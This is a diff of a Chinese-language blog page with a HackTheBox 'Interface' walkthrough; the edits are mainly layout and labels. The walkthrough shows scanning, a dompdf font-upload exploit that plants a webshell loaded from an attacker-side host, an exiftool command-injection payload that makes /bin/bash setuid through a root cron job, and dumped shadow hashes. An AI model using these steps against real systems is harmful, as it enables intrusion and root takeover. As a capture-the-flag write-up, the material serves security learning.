@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;527  10.10.11.200                                                                                                              端口扫描22和80: 12345678">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;527  10.10.11.200   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.200Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-02-13 13:">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Interface - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/02/13/Interface-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;527  10.10.11.200                                                                                                              端口扫描22和80: 12345678">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;527  10.10.11.200   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.200Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-02-13 13:">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021301.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021302.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021303.jpg">
@@ -122,8 +122,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -145,7 +152,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -213,45 +220,17 @@
 </li>
 <li><h2 id="10-10-11-200"><a href="#10-10-11-200" class="headerlink" title="10.10.11.200"></a>10.10.11.200</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021301.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021301.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.200</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:15 CST</span><br><span class="line">Nmap scan report for 10.10.11.200</span><br><span class="line">Host is up (0.075s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)</span><br><span class="line">|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)</span><br><span class="line">|_  256 cc62905560a658629e6b80105c799b55 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Site Maintenance</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>没什么东西，但CSP中能得到一个域名：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021302.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021303.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021302.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021303.jpg" alt=""></p>
 <h2 id="prd-m-rendering-api-interface-htb"><a href="#prd-m-rendering-api-interface-htb" class="headerlink" title="prd.m.rendering-api.interface.htb"></a>prd.m.rendering-api.interface.htb</h2><p>添加host后直接访问是file not found：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.200 prd.m.rendering-api.interface.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021304.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021304.jpg" alt=""></p>
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描发现vendor和api,继续一步步扫描，注意扫描参数:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u "http://prd.m.rendering-api.interface.htb" -s 200,403,404 -b "" --exclude-length 0</span><br><span class="line"></span><br><span class="line">/api                  (Status: 404) [Size: 50]</span><br><span class="line">/api/experiments      (Status: 404) [Size: 50]</span><br><span class="line">/api/experiments/configurations (Status: 404) [Size: 50]</span><br><span class="line">/vendor               (Status: 403) [Size: 15]</span><br><span class="line"></span><br><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  -t 50 -u "http://prd.m.rendering-api.interface.htb/vendor/" -s 200,403,404 -b "" --exclude-length 0,50</span><br><span class="line"></span><br><span class="line">/dompdf               (Status: 403) [Size: 15]</span><br><span class="line">/composer             (Status: 403) [Size: 15]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w ~/Tools/dict/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50</span><br><span class="line"></span><br><span class="line">[Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 108ms]</span><br><span class="line">    * FUZZ: html2pdf</span><br></pre></td></tr></table></figure>
 
@@ -263,81 +242,25 @@
 <p>根据前面的结果，应该是html2pdf调用了pdf，我们需要通过这个api利用dompdf的漏洞：</p>
 <p>(pentesterlab里也有dompdf相关的，也可以去做一下)</p>
 <p>就是用github里的内容，修改exploit.css中的php链接，修改php文件中的代码，通过html2pdf上传字体文件(参数格式也是常规fuzz)：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021305.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021306.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021305.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021306.jpg" alt=""></p>
 <p>然后根据命名规则计算出服务器上webshell的路径：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> -n <span class="string">'http://10.10.14.10:7777/exploit_font.php'</span> | md5sum</span></span><br><span class="line">78e00b92375ea46740203760ffdd85fd  -</span><br><span class="line"></span><br><span class="line">http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_78e00b92375ea46740203760ffdd85fd.php?cmd=whoami</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021307.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021308.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021307.jpg" alt=""></p>
+<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021308.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的是www-data shell,但有权限读dev用户目录的user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021309.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021309.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>root权限定时运行/usr/local/sbin/cleancache.sh，查看内容发现是通过exiftool检查/tmp目录下的文件的Producer是否是dompdf，然后进行清理，我们可以利用这一点进行命令注入：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021310.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021310.jpg" alt=""></p>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>准备一个要执行的文件，因为已经知道tmp目录有自动清理，所有使用其他可写目录:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash-4.4$ cat &gt; /dev/shm/shell.sh &lt;&lt; EOF</span><br><span class="line">cat &gt; /dev/shm/shell.sh &lt;&lt; EOF</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="comment">#!/bin/bash</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> chmod +s /bin/bash</span></span><br><span class="line">chmod +s /bin/bash</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> EOF</span></span><br><span class="line">bash-4.4$ chmod +x /dev/shm/shell.sh</span><br></pre></td></tr></table></figure>
 
 <p>tmp目录下创建一个文件，修改Producer进行命令注入，等待触发：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/exiftool -Producer='a[$(/dev/shm/shell.sh&gt;&amp;2)]+42' /tmp/exp</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021311.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021312.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021311.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021312.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$vNqg&#x2F;kOl$yP48ihB9Tz5fyR0bjFvDk&#x2F;ZMwmOpr&#x2F;a6Bx7Z3fpsTNQM.k2ip0weEHpNr2C0OY2qEIspg4KuTtB3R32.bPieX0:19316:0:99999:7:::</span><br><span class="line">dev:$6$2RlsJ6Cm$3qBSlRXSbX0tjTK7orUlt3Wub&#x2F;ahd1f5kAVDhnvd8zm2vFuPotd7o04vH04OgPjdvsfUp2sOpqQJz5Cge2h4C0:19367:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
@@ -355,7 +278,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-05-15T05:27:28.381Z" itemprop="dateUpdated">2023-05-15 13:27:28</time>
+    Last updated: <time datetime="2023-05-15T05:27:28.381Z" itemprop="dateUpdated">2023-05-15 13:27:28</time>
 </span><br>
 
 
@@ -522,11 +445,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
